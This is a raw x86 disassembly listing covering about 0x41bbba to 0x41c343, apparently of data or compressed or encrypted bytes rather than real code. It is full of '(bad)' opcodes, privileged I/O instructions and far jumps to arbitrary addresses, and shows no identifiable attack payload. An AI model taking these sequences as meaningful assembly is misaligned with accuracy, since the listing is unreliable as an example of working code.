  41bbba:	push   esi
  41bbbb:	mov    cl,0xc6
  41bbbd:	jno    0x41bb74
  41bbbf:	ret    0x3f3
  41bbc2:	xchg   BYTE PTR [ebx],cl
  41bbc4:	sbb    eax,0x475bd18a
  41bbc9:	inc    edx
  41bbca:	outs   dx,BYTE PTR ds:[esi]
  41bbcb:	jmp    0xbcd6:0x16203df4
  41bbd2:	xor    edx,DWORD PTR [ecx]
  41bbd4:	or     BYTE PTR [edi],ch
  41bbd6:	mov    ebp,ecx
  41bbd8:	pop    edx
  41bbd9:	cmp    eax,0x91555420
  41bbde:	out    dx,al
  41bbdf:	dec    ebx
  41bbe0:	xor    al,BYTE PTR [edx+0x30]
  41bbe3:	xor    al,0xe
  41bbe5:	stos   DWORD PTR es:[edi],eax
  41bbe6:	inc    eax
  41bbe7:	cli    
  41bbe8:	stos   BYTE PTR es:[edi],al
  41bbe9:	mov    dh,0x9b
  41bbeb:	sbb    eax,0xe1e49dc0
  41bbf0:	jne    0x41bc6f
  41bbf2:	lock mov WORD PTR [edx+0x1b],gs
  41bbf6:	jg     0x41bc05
  41bbf8:	popf   
  41bbf9:	int3   
  41bbfa:	dec    edx
  41bbfb:	sub    bl,BYTE PTR [esi-0x577e0e11]
  41bc01:	rcr    dl,1
  41bc03:	shl    DWORD PTR [ecx+0x32],cl
  41bc06:	fwait
  41bc07:	mov    WORD PTR [eax+0x60],gs
  41bc0a:	pop    eax
  41bc0b:	(bad)  
  41bc0c:	sub    al,0x22
  41bc0e:	push   eax
  41bc0f:	fldenv [edi-0x3622deb4]
  41bc15:	imul   edi,DWORD PTR [ecx+0x6f],0xffffffe1
  41bc19:	sbb    DWORD PTR [eax],eax
  41bc1b:	lods   al,BYTE PTR ds:[esi]
  41bc1c:	mov    cl,cl
  41bc1e:	sub    al,BYTE PTR [ebp+ecx*2-0x74]
  41bc22:	mov    cl,0x14
  41bc24:	retf   0x7e6
  41bc27:	push   ss
  41bc28:	xchg   DWORD PTR [ebp+0x15],ebp
  41bc2b:	adc    dh,BYTE PTR [edx+0x9cb8d00]
  41bc31:	sub    al,0x71
  41bc33:	pop    ebx
  41bc34:	test   BYTE PTR [ebx],dl
  41bc36:	sub    BYTE PTR [eax-0x14],0x6b
  41bc3a:	popa   
  41bc3b:	ret    
  41bc3c:	jg     0x41bbf9
  41bc3e:	popa   
  41bc3f:	leave  
  41bc40:	mov    dh,0xd6
  41bc42:	(bad)  
  41bc43:	dec    ebp
  41bc44:	adc    DWORD PTR [edi-0x3599075],ebx
  41bc4a:	sub    ebp,DWORD PTR [ebp+0x66]
  41bc4d:	inc    ecx
  41bc4e:	mov    DWORD PTR [esi],0x26078030
  41bc54:	mov    edx,0x7ff2a5be
  41bc59:	lods   eax,DWORD PTR ds:[esi]
  41bc5a:	push   ss
  41bc5b:	pushf  
  41bc5c:	and    BYTE PTR [esi+0x6929062a],0xfe
  41bc63:	jmp    0xc407:0x49302880
  41bc6a:	mov    dl,0x62
  41bc6c:	mov    ah,0xc6
  41bc6e:	jnp    0x41bc0c
  41bc70:	mov    ds:0x28dd4eb3,al
  41bc75:	lea    edi,[edx+0x6e]
  41bc78:	adc    DWORD PTR [esi+edx*8-0x1ea6b777],eax
  41bc7f:	jae    0x41bcf8
  41bc81:	daa    
  41bc82:	push   edx
  41bc83:	jno    0x41bc94
  41bc85:	daa    
  41bc86:	ins    BYTE PTR es:[edi],dx
  41bc87:	or     al,0xc3
  41bc89:	inc    ebp
  41bc8a:	fstp   TBYTE PTR [ebx]
  41bc8c:	nop
  41bc8d:	pop    edx
  41bc8e:	inc    esi
  41bc8f:	nop
  41bc90:	fld1   
  41bc92:	ds or  al,0x21
  41bc95:	push   0x44
  41bc97:	mov    eax,ds:0xaa5fb5c5
  41bc9c:	inc    ecx
  41bc9d:	mov    BYTE PTR [ebx-0x2cc3c2df],ch
  41bca3:	cmp    ecx,DWORD PTR [edi+0x2a1ff18c]
  41bca9:	push   esi
  41bcaa:	sbb    bl,BYTE PTR [edx]
  41bcac:	and    eax,0x8819be1e
  41bcb1:	pop    ebx
  41bcb2:	icebp  
  41bcb3:	in     al,dx
  41bcb4:	mov    dl,0x8d
  41bcb6:	sbb    eax,0xf7b2e9f
  41bcbb:	and    DWORD PTR [edi-0x15],0xacee1d3a
  41bcc2:	jae    0x41bcd7
  41bcc4:	dec    edi
  41bcc5:	std    
  41bcc6:	inc    eax
  41bcc7:	icebp  
  41bcc8:	(bad)  
  41bccb:	cs jno 0x41bc71
  41bcce:	jp     0x41bc86
  41bcd0:	cmp    BYTE PTR [eax+0x4d],ah
  41bcd3:	leave  
  41bcd4:	mov    ds:0x167b1c35,al
  41bcd9:	add    ch,BYTE PTR [ecx]
  41bcdb:	lds    eax,FWORD PTR [edi]
  41bcdd:	mov    edi,0x29ad17b2
  41bce2:	sub    BYTE PTR [ebx],dl
	...
  41bcf0:	add    ah,bh
  41bcf2:	mov    WORD PTR [ebx+edx*8-0x5000040c],?
  41bcf9:	and    al,0xd
  41bcfb:	jmp    0x41bd54
  41bcfd:	adc    ebp,ecx
  41bcff:	push   ecx
  41bd00:	das    
  41bd01:	mov    ebp,0xab000139
  41bd06:	add    eax,DWORD PTR [eax]
  41bd08:	add    BYTE PTR [esi],dl
  41bd0a:	sub    BYTE PTR [ebp+0x7ae9b118],0xbd
  41bd11:	mov    cl,BYTE PTR [esi+0x2d]
  41bd14:	jns    0x41bd6a
  41bd16:	sbb    eax,0x80c1650e
  41bd1b:	call   0xeecff212
  41bd20:	mov    esp,0x6711fcac
  41bd25:	jae    0x41bd5c
  41bd27:	mov    dh,0xe
  41bd29:	es or  dl,ah
  41bd2c:	imul   esi,DWORD PTR [edx],0xffffffbd
  41bd2f:	mov    al,ds:0x22528852
  41bd34:	loopne 0x41bcf0
  41bd36:	fistp  WORD PTR fs:[ebp+0x38088cae]
  41bd3d:	jl     0x41bd31
  41bd3f:	icebp  
  41bd40:	js     0x41bdba
  41bd42:	dec    edx
  41bd43:	fidiv  DWORD PTR [ecx+0x8c05935]
  41bd49:	aad    0xed
  41bd4b:	mov    al,ds:0x234a55e6
  41bd50:	jno    0x41bd1b
  41bd52:	ja     0x41bd75
  41bd54:	loope  0x41bd4c
  41bd56:	imul   ebx,DWORD PTR [eax-0x1d],0xa220c181
  41bd5d:	or     al,dh
  41bd5f:	mov    edi,0x410542fb
  41bd64:	mov    ds:0x6329c79,al
  41bd69:	ja     0x41bd1d
  41bd6b:	mov    WORD PTR [ebp-0x1629ee4e],ds
  41bd71:	add    ebp,DWORD PTR [eax+0x5f638f0b]
  41bd77:	ficom  DWORD PTR [edi]
  41bd79:	jl     0x41bd61
  41bd7b:	jle    0x41bdef
  41bd7d:	push   cs
  41bd7e:	call   0x2d66:0x273a2f46
  41bd85:	inc    edi
  41bd86:	movups xmm2,XMMWORD PTR [ecx]
  41bd89:	xchg   ebp,eax
  41bd8a:	jnp    0x41bdd9
  41bd8c:	xchg   esi,eax
  41bd8d:	push   ebp
  41bd8e:	add    eax,0xdd1723c5
  41bd93:	mov    edi,DWORD PTR [edx]
  41bd95:	in     eax,0x4d
  41bd97:	dec    ebx
  41bd98:	gs inc edi
  41bd9a:	jge    0x41bda7
  41bd9c:	sbb    bl,BYTE PTR [edi+0xfbf9d2]
  41bda2:	or     BYTE PTR [edx-0xa],0xda
  41bda6:	daa    
  41bda7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bda8:	sbb    edx,DWORD PTR [ebx]
  41bdaa:	pop    ss
  41bdab:	inc    eax
  41bdac:	jae    0x41bda6
  41bdae:	push   eax
  41bdaf:	dec    ecx
  41bdb0:	es stos BYTE PTR es:[edi],al
  41bdb2:	mov    al,0x2d
  41bdb4:	fild   WORD PTR [ebx+0x71]
  41bdb7:	cmp    BYTE PTR [ecx+ebx*8+0x3bab183a],al
  41bdbe:	psubsw mm4,QWORD PTR [ecx+0x6ed42ba8]
  41bdc5:	scas   eax,DWORD PTR es:[edi]
  41bdc6:	mov    bl,0xab
  41bdc8:	xchg   esi,eax
  41bdc9:	mov    WORD PTR [edi-0x41f08ed6],cs
  41bdcf:	inc    ecx
  41bdd0:	push   ecx
  41bdd1:	mov    ebx,0xe17c3590
  41bdd6:	sbb    eax,0xf8ed5f6e
  41bddb:	scas   al,BYTE PTR es:[edi]
  41bddc:	mov    dh,0x0
  41bdde:	mov    edx,0x528aa899
  41bde3:	or     al,0x58
  41bde5:	aam    0x84
  41bde7:	pop    edx
  41bde8:	xlat   BYTE PTR ds:[ebx]
  41bde9:	pop    ebx
  41bdea:	add    BYTE PTR [ecx-0x3a],0x9f
  41bdee:	ins    DWORD PTR es:[edi],dx
  41bdef:	mov    al,0x6f
  41bdf1:	mov    dl,BYTE PTR [esp+ecx*8]
  41bdf4:	iret   
  41bdf5:	push   es
  41bdf6:	add    cl,cl
  41bdf8:	and    edx,DWORD PTR [ecx-0x61]
  41bdfb:	(bad)  [esi-0x59530cc0]
  41be01:	inc    ebp
  41be02:	lea    edi,ds:0x425a37fd
  41be08:	fwait
  41be09:	stos   DWORD PTR es:[edi],eax
  41be0a:	sar    BYTE PTR [ebx-0xafadb28],0x25
  41be11:	add    edi,ebx
  41be13:	mov    al,al
  41be15:	pop    ecx
  41be16:	jle    0x41be44
  41be18:	xchg   ebp,eax
  41be19:	inc    DWORD PTR [ebp+0xa314ef7]
  41be1f:	iret   
  41be20:	xchg   ah,dh
  41be22:	iret   
  41be23:	jmp    0x6e3:0xa928590e
  41be2a:	cmp    DWORD PTR [eax],esi
  41be2c:	addr16 push ebx
  41be2e:	mov    ebx,0x6532ac0f
  41be33:	dec    al
  41be35:	jmp    ecx
  41be37:	add    edi,DWORD PTR [esi-0x3ad084d7]
  41be3d:	icebp  
  41be3e:	rcr    edx,1
  41be40:	into   
  41be41:	sub    BYTE PTR [ecx+0x47],ch
  41be44:	jne    0x41be1a
  41be46:	ds retf 
  41be48:	push   esp
  41be49:	adc    ah,0x87
  41be4c:	push   esi
  41be4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be4e:	cmp    al,0x1c
  41be50:	pusha  
  41be51:	sqrtps xmm0,XMMWORD PTR [esi]
  41be54:	xlat   BYTE PTR ds:[ebx]
  41be55:	retf   0xf0af
  41be58:	hlt    
  41be59:	icebp  
  41be5a:	int3   
  41be5b:	add    eax,0x538ff672
  41be60:	jge    0x41be5d
  41be62:	or     eax,0x6dad35f1
  41be67:	dec    esi
  41be68:	xchg   DWORD PTR [ebx],ebp
  41be6a:	call   0x9055:0x227755e9
  41be71:	dec    edi
  41be72:	pop    ecx
  41be73:	lahf   
  41be74:	add    al,0x28
  41be77:	inc    ebp
  41be78:	jnp    0x41be23
  41be7a:	jno    0x41be75
  41be7c:	jg     0x41be14
  41be7e:	xchg   ebx,eax
  41be7f:	test   al,0x6f
  41be81:	push   ss
  41be82:	popf   
  41be83:	xchg   ecx,eax
  41be84:	mov    cl,0xd9
  41be86:	sub    ah,dl
  41be88:	and    eax,0x9c47d233
  41be8d:	outs   dx,BYTE PTR ds:[esi]
  41be8e:	mov    edx,0x7ab77592
  41be93:	jb     0x41be80
  41be95:	pusha  
  41be96:	cld    
  41be97:	jmp    0x6168d426
  41be9c:	aad    0xf1
  41be9e:	sub    ch,dh
  41bea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bea1:	dec    ebx
  41bea2:	mov    ah,0x3f
  41bea4:	out    dx,eax
  41bea5:	sub    BYTE PTR [esi+esi*2],ah
  41bea8:	mov    edi,0xa4361515
  41bead:	in     al,dx
  41beae:	test   eax,0xe7de1a5e
  41beb3:	jb     0x41bee3
  41beb5:	mov    ds:0xcf1f083a,al
  41beba:	jle    0x41be3f
  41bebc:	xchg   DWORD PTR [ebx],esp
  41bebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bebf:	sahf   
  41bec0:	cld    
  41bec1:	pop    ss
  41bec2:	mov    ch,0x57
  41bec4:	add    DWORD PTR [ebx-0x46],0x7a
  41bec8:	std    
  41bec9:	cwde   
  41beca:	sbb    BYTE PTR [eax+0x76b00872],al
  41bed0:	sti    
  41bed1:	xchg   BYTE PTR [esi],bh
  41bed3:	pop    ds
  41bed4:	sub    eax,eax
  41bed6:	(bad)  
  41bed7:	xchg   esp,eax
  41bed8:	fs pop esp
  41beda:	in     eax,0xbf
  41bedc:	aad    0xcb
  41bede:	(bad)  
  41bedf:	inc    edi
  41bee0:	adc    dl,cl
  41bee2:	pop    esi
  41bee3:	call   0x8235:0x64457d75
  41beea:	test   al,0x1d
  41beec:	jg     0x41be96
  41beee:	jne    0x41bf2e
  41bef0:	push   ebx
  41bef1:	jg     0x41bf44
  41bef3:	dec    ebp
  41bef4:	dec    ebx
  41bef5:	lea    edi,[ebx+0x34]
  41bef8:	stc    
  41bef9:	pop    eax
  41befa:	xor    BYTE PTR [ebx],ah
  41befc:	push   esp
  41befd:	rcl    bh,1
  41beff:	pusha  
  41bf00:	scas   al,BYTE PTR es:[edi]
  41bf01:	dec    ebp
  41bf02:	addr16 fs retf 
  41bf05:	out    0xba,eax
  41bf07:	inc    ecx
  41bf08:	mov    esi,0x63662a48
  41bf0d:	std    
  41bf0e:	fs popf 
  41bf10:	xor    ch,BYTE PTR ds:0x247fc3ad
  41bf16:	and    DWORD PTR [ebx-0x3fa60a68],ebp
  41bf1c:	add    ah,BYTE PTR [eax+0x74]
  41bf1f:	and    bh,al
  41bf21:	cs push esi
  41bf23:	outs   dx,BYTE PTR ds:[esi]
  41bf24:	sahf   
  41bf25:	retf   0x22f5
  41bf28:	rol    al,1
  41bf2a:	jbe    0x41bf09
  41bf2c:	jge    0x41beaf
  41bf2e:	push   ebp
  41bf2f:	mov    eax,DWORD PTR [ebp+ebx*2-0x7deca4da]
  41bf36:	add    al,0x2b
  41bf38:	in     eax,0x7a
  41bf3a:	jnp    0x41bf15
  41bf3c:	test   DWORD PTR [ebp+0x68b0780e],ebx
  41bf42:	jmp    0x41bf32
  41bf44:	inc    eax
  41bf45:	int3   
  41bf46:	push   ecx
  41bf47:	mov    esi,0xc5897e43
  41bf4c:	cld    
  41bf4d:	cmp    esp,DWORD PTR [eax+edx*1]
  41bf50:	les    esp,FWORD PTR [ecx+0x6e]
  41bf53:	xchg   BYTE PTR [edi+0xf6d3a8f],al
  41bf59:	popa   
  41bf5a:	cmp    BYTE PTR [ebx],ch
  41bf5c:	out    dx,al
  41bf5d:	fild   QWORD PTR [ecx]
  41bf5f:	dec    ebp
  41bf60:	jo     0x41bf9c
  41bf62:	jae    0x41bf45
  41bf64:	ret    
  41bf65:	cmp    DWORD PTR [edi],esi
  41bf67:	loop   0x41bf3a
  41bf69:	mov    ebx,esi
  41bf6b:	fld    TBYTE PTR ds:[eax+edx*4+0x798266e0]
  41bf73:	nop
  41bf74:	aam    0xd9
  41bf76:	sbb    edi,DWORD PTR [edi-0x1c]
  41bf79:	adc    edx,DWORD PTR [ebp+0x35]
  41bf7c:	sub    bh,bl
  41bf7e:	lods   al,BYTE PTR ds:[esi]
  41bf7f:	stc    
  41bf80:	jecxz  0x41bf98
  41bf82:	mov    ch,0xf3
  41bf84:	ret    
  41bf85:	jbe    0x41bf35
  41bf87:	les    esi,FWORD PTR [edi]
  41bf89:	dec    esi
  41bf8a:	fwait
  41bf8b:	jbe    0x41bfad
  41bf8d:	cli    
  41bf8e:	jle    0x41bf42
  41bf90:	lea    ecx,[ecx]
  41bf92:	lock je 0x41bf78
  41bf95:	mov    ah,0x2b
  41bf97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf98:	add    bh,BYTE PTR [eax-0xb972dc8]
  41bf9e:	sbb    BYTE PTR [ebx-0x63],al
  41bfa1:	popf   
  41bfa2:	js     0x41bf93
  41bfa4:	xchg   ecx,eax
  41bfa5:	call   0x76f1:0x6b1f12c8
  41bfac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfad:	sub    cl,BYTE PTR [di]
  41bfb0:	leave  
  41bfb1:	retf   0x21fd
  41bfb4:	push   ss
  41bfb5:	and    eax,ecx
  41bfb7:	pushf  
  41bfb8:	push   ds
  41bfb9:	sbb    eax,0x25cef257
  41bfbe:	lock mov esp,edi
  41bfc1:	jmp    0xab1fb1b7
  41bfc6:	jp     0x41bfa3
  41bfc8:	inc    ebx
  41bfc9:	add    ebp,DWORD PTR [edx-0x59]
  41bfcc:	mov    eax,0xb41b7c6f
  41bfd1:	(bad)  
  41bfd2:	ds dec edi
  41bfd4:	jle    0x41bfa8
  41bfd6:	xchg   BYTE PTR [ebx-0x5f],bh
  41bfd9:	xchg   edx,eax
  41bfda:	sbb    BYTE PTR [eax],bh
  41bfdc:	adc    al,0xf4
  41bfde:	les    ebx,FWORD PTR [edi+0x210a0db5]
  41bfe4:	xchg   edi,eax
  41bfe5:	sub    BYTE PTR [edx+esi*1],ch
  41bfe8:	jns    0x41c055
  41bfea:	push   esp
  41bfeb:	or     BYTE PTR [eax-0x3b],ah
  41bfee:	sbb    eax,0xb3843d33
  41bff3:	mov    al,ds:0xc20b4ffa
  41bff8:	and    al,0xa
  41bffa:	dec    ecx
  41bffb:	retf   
  41bffc:	fild   QWORD PTR [esi]
  41bffe:	inc    ebx
  41bfff:	(bad)  
  41c000:	cmp    bl,BYTE PTR [edx+ebp*2+0x20aa8e60]
  41c007:	fcmovnbe st,st(1)
  41c009:	jae    0x41c059
  41c00b:	jle    0x41bfb0
  41c00d:	mov    ecx,0xb0693830
  41c012:	pop    ecx
  41c013:	imul   ebp,esi,0xffffffe3
  41c016:	xchg   esp,eax
  41c017:	mov    al,ds:0x2b9498de
  41c01c:	mov    ebp,0x807c919e
  41c021:	xchg   ebx,eax
  41c022:	sub    ebx,0x4daf789c
  41c028:	mov    edi,0xbd2a1f6c
  41c02d:	(bad)  
  41c02e:	mov    dh,0x18
  41c030:	sub    DWORD PTR ds:0x23c6d37f,edi
  41c036:	adc    eax,0x42a0dba7
  41c03b:	push   0x2919261d
  41c040:	inc    ebp
  41c041:	(bad)  
  41c043:	xor    BYTE PTR [ebx+0x6d],dh
  41c046:	ror    DWORD PTR [ebp+ecx*1-0x10bb6966],0x3
  41c04e:	sub    DWORD PTR es:0xf3449018,esp
  41c055:	cmp    ah,BYTE PTR [ecx+0x18db2507]
  41c05b:	int    0x92
  41c05d:	sub    eax,0x3bfd5535
  41c062:	scas   eax,DWORD PTR es:[edi]
  41c063:	aam    0x55
  41c065:	imul   edi,DWORD PTR [eax-0x5b],0xffffff88
  41c069:	div    ebx
  41c06b:	stos   BYTE PTR es:[edi],al
  41c06c:	jb     0x41c0af
  41c06e:	loope  0x41bff9
  41c070:	imul   ecx
  41c072:	xchg   edi,eax
  41c073:	cmp    BYTE PTR [ebp-0x67],cl
  41c076:	sbb    edi,DWORD PTR ds:0x36ce087e
  41c07c:	fisttp WORD PTR [ebp-0x2834a1e4]
  41c082:	xchg   ecx,eax
  41c083:	xchg   edx,eax
  41c084:	mov    bh,dh
  41c086:	adc    BYTE PTR [eax-0x6b],ch
  41c089:	inc    edx
  41c08a:	cld    
  41c08b:	loopne 0x41c035
  41c08d:	xchg   bl,ch
  41c08f:	push   es
  41c090:	mov    DWORD PTR [ecx-0x2160663],esp
  41c096:	push   0xffffff82
  41c098:	and    al,0xe6
  41c09a:	sub    ch,BYTE PTR [edi+0x4d]
  41c09d:	push   ss
  41c09e:	mov    ah,0xc9
  41c0a0:	adc    esi,esp
  41c0a2:	and    BYTE PTR es:[ebp+0x45beef16],0x5c
  41c0aa:	jecxz  0x41c077
  41c0ac:	push   0x1d
  41c0ae:	sbb    ebx,DWORD PTR [edi+0x7b650c04]
	...
  41c0c0:	add    bl,cl
  41c0c2:	test   al,0x91
  41c0c4:	sbb    eax,0xfecf3df3
  41c0c9:	dec    ebp
  41c0ca:	fisub  DWORD PTR [ecx+edi*1-0x4e]
  41c0ce:	xchg   DWORD PTR [ecx-0x76],esp
  41c0d1:	push   0xab00013d
  41c0d6:	add    eax,DWORD PTR [eax]
  41c0d8:	add    BYTE PTR [esi+0x6a],bl
  41c0db:	call   FWORD PTR ds:0x9634b100
  41c0e1:	push   0xffffffd1
  41c0e3:	test   cl,bl
  41c0e5:	sbb    DWORD PTR [edx+0x571e56b4],0x33
  41c0ec:	push   edi
  41c0ed:	rcr    DWORD PTR [esi+0x2e],cl
  41c0f0:	push   edx
  41c0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0f2:	mov    ah,0x4
  41c0f4:	stos   BYTE PTR es:[edi],al
  41c0f5:	loopne 0x41c0fc
  41c0f7:	mov    dh,0x60
  41c0f9:	div    DWORD PTR [edx-0x2e]
  41c0fc:	aaa    
  41c0fd:	lea    ebp,[ebx+0x14dcc1b4]
  41c103:	mov    edx,0xf0c3d0b2
  41c108:	sbb    al,0x98
  41c10a:	js     0x41c0c4
  41c10c:	std    
  41c10d:	in     eax,dx
  41c10e:	push   ecx
  41c10f:	push   edi
  41c110:	jge    0x41c167
  41c112:	lahf   
  41c113:	adc    ch,BYTE PTR [edx+0x19]
  41c116:	vpunpckhqdq ymm4,ymm1,YMMWORD PTR [esi]
  41c11a:	cmp    cl,ch
  41c11c:	cs scas al,BYTE PTR es:[edi]
  41c11e:	pop    ecx
  41c11f:	rol    DWORD PTR [ebx+0x4e],1
  41c122:	inc    esp
  41c123:	addr16 retf 
  41c125:	ds mov bh,0x41
  41c128:	jle    0x41c151
  41c12a:	pop    eax
  41c12b:	push   ebp
  41c12c:	loope  0x41c0c4
  41c12e:	dec    esp
  41c12f:	adc    eax,DWORD PTR [ebx+0x4f0c52bf]
  41c135:	fst    DWORD PTR [esi+eiz*1+0x41f56bc9]
  41c13c:	pop    edx
  41c13d:	in     eax,dx
  41c13e:	push   cs
  41c13f:	jmp    0xa4b3c4
  41c144:	push   esp
  41c145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c146:	add    BYTE PTR [eax-0x2d],cl
  41c149:	lods   al,BYTE PTR ds:[esi]
  41c14a:	inc    eax
  41c14b:	inc    edx
  41c14c:	fs pop ebp
  41c14e:	jecxz  0x41c145
  41c150:	retf   0x30ab
  41c153:	imul   ecx,DWORD PTR [ebx-0x7e],0xffffffeb
  41c157:	mov    bl,0xf2
  41c159:	imul   edx,DWORD PTR [edi-0x50],0x6f707994
  41c160:	xchg   DWORD PTR [ecx-0x25],esp
  41c163:	push   edi
  41c164:	push   eax
  41c165:	push   ss
  41c166:	mov    ebp,0x94a8160d
  41c16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c16c:	mov    ebx,0x271b991b
  41c171:	push   ebp
  41c172:	inc    esp
  41c173:	and    dh,cl
  41c175:	mov    edi,DWORD PTR [ebp-0x3cc96e50]
  41c17b:	jle    0x41c184
  41c17d:	cmp    eax,0x31a40339
  41c182:	sbb    al,BYTE PTR [eax]
  41c184:	or     eax,0xef10690e
  41c189:	xchg   ebx,eax
  41c18a:	mov    al,0xe7
  41c18c:	cmp    BYTE PTR [edi],0x9d
  41c18f:	and    ah,BYTE PTR [edx-0x3d]
  41c192:	cdq    
  41c193:	sub    eax,0x62969eb3
  41c198:	in     eax,dx
  41c199:	dec    esi
  41c19a:	or     DWORD PTR [edx-0x7d9c480b],ecx
  41c1a0:	(bad)  [ebx+0x61f4f114]
  41c1a6:	mov    cl,0xbf
  41c1a8:	ss pop edx
  41c1aa:	jmp    0xef68:0xd85068b8
  41c1b1:	ja     0x41c149
  41c1b3:	ins    BYTE PTR es:[edi],dx
  41c1b4:	scas   eax,DWORD PTR es:[edi]
  41c1b5:	push   0x2d
  41c1b7:	push   edx
  41c1b8:	scas   eax,DWORD PTR es:[edi]
  41c1b9:	sbb    BYTE PTR [edi],cl
  41c1bb:	add    al,0x6
  41c1bd:	adc    ah,cl
  41c1bf:	mov    edx,eax
  41c1c1:	xor    al,0xd3
  41c1c3:	gs mov ebx,0x871bc783
  41c1c9:	call   DWORD PTR [esi]
  41c1cb:	std    
  41c1cc:	push   ds
  41c1cd:	sub    eax,DWORD PTR [ebx-0x63]
  41c1d0:	add    dh,BYTE PTR [eax-0x60]
  41c1d3:	sbb    DWORD PTR [ebx+0x66],edx
  41c1d6:	dec    esi
  41c1d7:	xchg   ebx,eax
  41c1d8:	fild   QWORD PTR [ecx-0x22]
  41c1db:	retf   0xa992
  41c1de:	fist   DWORD PTR [eax-0x1761cd54]
  41c1e4:	inc    edx
  41c1e5:	or     eax,0x74804e8c
  41c1ea:	or     dl,BYTE PTR [edx]
  41c1ec:	mov    esp,0xca47ac6e
  41c1f1:	pop    edi
  41c1f2:	(bad)  
  41c1f3:	fbstp  TBYTE PTR [eax]
  41c1f5:	iret   
  41c1f6:	out    dx,al
  41c1f7:	mov    al,0x3
  41c1f9:	add    al,0xd8
  41c1fb:	push   edi
  41c1fc:	in     al,0x66
  41c1fe:	inc    esi
  41c1ff:	aad    0xdb
  41c201:	push   ebx
  41c202:	fs aas 
  41c204:	mov    ds:0xe1f791f7,eax
  41c209:	xor    al,0xec
  41c20b:	mov    edi,0x62606df4
  41c210:	test   DWORD PTR [eax+0x555ee8cf],ebx
  41c216:	retf   0x4043
  41c219:	hlt    
  41c21a:	mov    al,0x67
  41c21c:	(bad)  
  41c21d:	je     0x41c1d2
  41c21f:	push   ebp
  41c220:	xor    dl,dl
  41c222:	fidivr DWORD PTR [eax]
  41c224:	test   BYTE PTR [eax+0x572f3c01],ch
  41c22a:	sti    
  41c22b:	mov    dh,0x9b
  41c22d:	cli    
  41c22e:	adc    BYTE PTR [edx],bl
  41c230:	js     0x53123a10
  41c236:	icebp  
  41c237:	mov    ch,BYTE PTR [ebp-0x62]
  41c23a:	outs   dx,DWORD PTR ds:[esi]
  41c23b:	in     eax,dx
  41c23c:	loopne 0x41c2ad
  41c23e:	pop    eax
  41c23f:	(bad)  [edi+ecx*2+0x73]
  41c243:	pop    ebx
  41c244:	test   BYTE PTR [ebx],dh
  41c246:	sbb    BYTE PTR [esp+edi*4],0xc0
  41c24a:	lsl    ebx,WORD PTR ds:0x773b6dcb
  41c251:	mov    dh,BYTE PTR [edx+0x66]
  41c254:	sub    eax,0x241b7365
  41c259:	(bad)  
  41c25a:	cmp    BYTE PTR [edx],cl
  41c25c:	(bad)  
  41c25e:	jmp    0x6fb071f9
  41c263:	pop    edx
  41c264:	pop    esi
  41c265:	mov    ds:0x4a4acbc7,al
  41c26a:	out    0xe2,eax
  41c26c:	or     bl,dh
  41c26e:	(bad)  
  41c26f:	out    0xae,eax
  41c271:	(bad)  
  41c272:	fisubr WORD PTR [ebp-0x56]
  41c275:	out    0xf2,al
  41c277:	loop   0x41c284
  41c279:	push   ebx
  41c27a:	out    dx,eax
  41c27b:	mov    eax,0x10ebbc4f
  41c280:	push   esp
  41c281:	dec    ecx
  41c282:	pop    edi
  41c283:	xchg   ecx,eax
  41c284:	cmp    DWORD PTR [ebp+0x7f],0xffffff82
  41c288:	mov    BYTE PTR [esi+0x6602cf53],al
  41c28e:	dec    ebx
  41c28f:	xchg   ecx,eax
  41c290:	aad    0xfb
  41c292:	adc    al,BYTE PTR [ecx+0x4c079f69]
  41c298:	int3   
  41c299:	std    
  41c29a:	in     al,dx
  41c29b:	add    BYTE PTR ds:0x9cd9cf83,0x27
  41c2a2:	sbb    ebp,DWORD PTR [edx+0x105fefc2]
  41c2a8:	loopne 0x41c25f
  41c2aa:	sbb    BYTE PTR ds:0xee38bf39,ch
  41c2b0:	mov    cl,0xed
  41c2b2:	in     al,dx
  41c2b3:	out    dx,eax
  41c2b4:	call   0x39cca32f
  41c2b9:	push   ebp
  41c2ba:	clc    
  41c2bb:	mov    edi,ebp
  41c2bd:	or     DWORD PTR [esi-0x60ba24cd],ecx
  41c2c3:	push   ss
  41c2c4:	repnz stos BYTE PTR es:[edi],al
  41c2c6:	mov    eax,0xb80427a5
  41c2cb:	loop   0x41c33f
  41c2cd:	shr    BYTE PTR [ebp-0x2a],cl
  41c2d0:	mov    edx,0xf795cd4a
  41c2d5:	dec    edx
  41c2d6:	jmp    FWORD PTR [ebx+0x511d6c67]
  41c2dc:	int3   
  41c2dd:	adc    cl,al
  41c2df:	xor    eax,0x89ad3837
  41c2e4:	mov    DWORD PTR [ecx+0x2d688d6c],esp
  41c2ea:	in     al,0x4e
  41c2ec:	adc    dl,0x96
  41c2ef:	gs mov ebx,0x3857e59e
  41c2f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2f6:	xchg   esp,eax
  41c2f7:	test   al,0x19
  41c2f9:	push   ebp
  41c2fa:	xchg   BYTE PTR [eax-0x7b],dh
  41c2fd:	popa   
  41c2fe:	lods   al,BYTE PTR ds:[esi]
  41c2ff:	call   0x4890:0x383d5771
  41c306:	or     cl,BYTE PTR gs:[eax]
  41c309:	xor    al,0xd6
  41c30b:	cli    
  41c30c:	jb     0x41c341
  41c30e:	sub    eax,0x30372693
  41c313:	pop    es
  41c314:	or     ebp,ebx
  41c316:	ins    DWORD PTR es:[edi],dx
  41c317:	pop    esi
  41c318:	jmp    0x41c393
  41c31a:	(bad)
  41c31d:	pavgw  mm2,QWORD PTR [eax-0x7d]
  41c321:	sbb    BYTE PTR [ecx],bh
  41c323:	jge    0x41c31b
  41c325:	call   0x91a9:0xb834da6e
  41c32c:	not    DWORD PTR [di]
  41c32f:	or     bl,BYTE PTR [esi+0x64]
  41c332:	rcr    DWORD PTR [eax],1
  41c334:	cdq    
  41c335:	test   BYTE PTR ds:[ebp+edx*8+0x6a],bh
  41c33a:	pop    eax
  41c33b:	push   edi
  41c33c:	mov    esi,0x7d2f2447
  41c341:	(bad)  
  41c342:	popf   
  41c343:	or     eax,0xe45ac96f
